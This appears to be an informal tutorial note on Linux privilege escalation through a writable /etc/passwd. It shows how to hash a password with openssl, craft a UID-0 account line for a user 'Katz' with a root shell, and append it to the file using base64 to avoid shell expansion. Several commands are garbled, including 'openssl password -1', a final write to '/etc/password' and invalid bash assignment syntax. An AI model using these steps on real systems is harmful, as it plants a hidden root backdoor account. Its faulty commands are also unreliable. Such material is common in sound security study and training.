# Important Notes

If you found that you can write to /etc/passwd

    -rw-rw-r — 1 root root 1637 Nov 23 23:46 /etc/passwd 

Use openssl to generate a password the password has HackedByKatz

    $ openssl password -1 

The purpose of the openssl passwd command is to feed your password through a one-way hashing algorithm (-1 outputs MD5). What that gets you is a string that's derived from your password cryptographically, but cannot be used to find your password on its own if an attacker gets their hands on the hashed version.

The /etc/passwd contains one entry per line for each user (or user account) of the system. All fields are separated by a colon(:) symbol. Total seven fields.

Now let's construct a user line based on what we just learned about /etc/passwd

    Katz:$1$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/:0:0:Katz:/root:/bin/bash

We can't write to /etc/passwd by vi or nano !! 

Test case:
    $ variable = Test 
    $ echo $variable 

    cat passwd 
    Katz:$1$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/:0:0:Katz:/root:/bin/bash

I have created a variable which contains the string <b>Test</b> all good right? Now if I want to display the string I assigned to the variable I have to use the $sign. That's how you call variables in bash. So there's going to be conflict when if we echo passwd >> /etc/passwd there won't be errors but bash will think that $1 and $ pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/ are variables and yout /etc/passwd file will look something like this ... 

    Katz::0:0:Katz:/root:/bin/bash

That will not allow you to login as the user Katz properly. Something that we could do to bypass this issue is to encode it in base64

    cat passwd | base64 -w 0 
    echo "xxxxx" | base64 -d 

Copy the base64 string to decode it but on it's way to being decoded also redirect it to the /etc/passwd file like so 

    echo "xxxx" | base64 -d >> /etc/password  


Making the best use of sudoers and SUID enabled file /etc/passwd :)
***


















